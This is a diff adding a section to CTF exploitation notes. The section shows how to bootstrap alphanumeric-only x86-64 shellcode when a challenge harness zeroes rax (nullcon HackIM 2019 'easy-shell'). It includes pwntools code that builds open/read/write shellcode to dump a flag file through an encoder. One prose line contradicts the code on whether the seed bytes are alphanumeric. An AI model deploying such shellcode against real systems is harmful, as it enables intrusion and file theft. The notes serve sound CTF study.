@@ -19,6 +19,7 @@
 - [Minimal Shellcode with Pre-Initialized Registers (Square CTF 2017)](#minimal-shellcode-with-pre-initialized-registers-square-ctf-2017)
 - [Unique-Byte Shellcode via syscall RIP to RCX (HITCON 2017)](#unique-byte-shellcode-via-syscall-rip-to-rcx-hitcon-2017)
 - [stub_execveat Syscall as execve Alternative (ASIS CTF 2018)](#stub_execveat-syscall-as-execve-alternative-asis-ctf-2018)
+- [Alphanumeric Shellcode Bootstrap via push/pop When rax=0 (nullcon HackIM 2019)](#alphanumeric-shellcode-bootstrap-via-pushpop-when-rax0-nullcon-hackim-2019)
 
 For double stack pivot, SROP with UTF-8 constraints, RETF architecture switch, seccomp bypass, .fini_array hijack, ret2vdso, pwntools template, and shellcode with input reversal, see [rop-advanced.md](rop-advanced.md).
 
@@ -615,3 +616,44 @@ io.interactive()
 **Key insight:** `stub_execveat` (syscall 322/0x142) accepts the same arguments as execve when `AT_FDCWD` is used, but its higher syscall number can be reached via `read()` return value when `pop rax; ret` gadgets are unavailable. Always check if alternative syscalls with equivalent functionality have numbers reachable through return values or other implicit register control.
 
 **References:** ASIS CTF 2018
+
+---
+
+## Alphanumeric Shellcode Bootstrap via push/pop When rax=0 (nullcon HackIM 2019)
+
+**Pattern (easy-shell):** RWX page receives attacker shellcode but every byte must be alphanumeric (`[0-9A-Za-z]`). Tools like [basic-amd64-alphanumeric-shellcode-encoder](https://github.com/veritas501/basic-amd64-alphanumeric-shellcode-encoder) emit self-decoding stubs but require `rax + padding_len == shellcode_address` at entry. When the harness enters with `rax = 0` (not anywhere near the shellcode) the encoder has nothing to land on. Prepend a tiny 3-byte non-alnum-but-accepted seed — `push r12; pop rax` — so `rax` becomes a live stack/code pointer, then call the encoder with `padding_len=3`.
+
+```python
+from pwn import *
+context(arch='amd64')
+
+file_name = "flag".ljust(8, '\x00')
+sc = '''
+    mov rax, %s
+    push rax
+    mov rdi, rsp
+    mov rax, 2          /* open(rsp, 0) */
+    mov rsi, 0
+    syscall
+    mov rdi, rax
+    sub rsp, 0x20
+    mov rsi, rsp
+    mov rdx, 0x20
+    mov rax, 0          /* read(fd, rsp, 0x20) */
+    syscall
+    mov rdi, 0
+    mov rsi, rsp
+    mov rdx, 0x20
+    mov rax, 1          /* write(1, rsp, 0x20) */
+    syscall
+''' % hex(u64(file_name))
+sc = asm(sc)
+
+# push r12 (0x41 0x54) + pop rax (0x58) = 3 bytes, all happen to be alnum-safe
+bootstrap = asm("push r12; pop rax;")
+payload = bootstrap + alphanum_encoder(sc, 3)
+```
+
+**Key insight:** Alphanumeric-only decoders typically need `rax` to point at (or a fixed offset before) the payload. If the harness zeroes `rax`, seed it from *any* volatile register that already holds a valid address — `r12` is routinely `_start` on Linux, and `push r12; pop rax` happens to be `AT X` (0x41 0x54 0x58), which the encoder's input filter treats as benign. Adjust the encoder's `padding_len` argument to exactly match the prepended byte count so the decode math still lines up.
+
+**References:** nullcon HackIM 2019 — easy-shell, writeups 13048, 13203
